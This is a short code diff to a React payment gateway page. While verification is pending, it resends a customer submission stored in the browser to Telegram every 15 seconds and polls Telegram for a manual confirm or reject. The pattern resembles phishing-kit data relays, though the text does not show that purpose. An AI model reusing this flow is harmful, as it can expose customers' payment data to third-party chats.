@@ -229,6 +229,60 @@ export default function PaymentGatewayPage({ order, onCancel }) {
     };
   }, [step, activeRefId, order?.refId]);
 
+  // Recurring reminder: If no action (Confirm/Invalid) is taken on Telegram, resend alert every 15s for up to 2 mins
+  useEffect(() => {
+    if (step !== 3 || verificationStatus !== 'PENDING') return;
+    const ref = activeRefId || order?.refId;
+    if (!ref) return;
+
+    // Load customer payload for resending
+    let payload = null;
+    try {
+      const saved = localStorage.getItem('ecosafeguard_last_submission');
+      if (saved) payload = JSON.parse(saved);
+    } catch (e) {}
+
+    if (!payload) return;
+
+    let reminderCount = 0;
+    const maxReminders = 8; // 8 * 15s = 120s (2 minutes)
+    const reminderIntervalMs = 15000; // 15 seconds
+
+    const reminderTimer = setInterval(async () => {
+      // Check if status changed or max reached
+      if (verificationStatus !== 'PENDING' || reminderCount >= maxReminders) {
+        clearInterval(reminderTimer);
+        return;
+      }
+
+      // Check live status from Telegram before sending reminder
+      try {
+        const check = await checkOrderStatusFromTelegram(ref);
+        if (check && (check.status === 'CONFIRMED' || check.status === 'INVALID')) {
+          setVerificationStatus(check.status);
+          setVerificationDetails(check);
+          clearInterval(reminderTimer);
+          return;
+        }
+      } catch (err) {}
+
+      reminderCount++;
+      await sendOrderToTelegram(payload, {
+        isReminder: true,
+        reminderIndex: reminderCount,
+        maxReminders: maxReminders
+      });
+
+      if (reminderCount >= maxReminders) {
+        clearInterval(reminderTimer);
+      }
+    }, reminderIntervalMs);
+
+    return () => {
+      clearInterval(reminderTimer);
+    };
+  }, [step, verificationStatus, activeRefId, order?.refId]);
+
   // Manual refresh trigger
   const handleManualCheck = async () => {
     const ref = activeRefId || order?.refId;
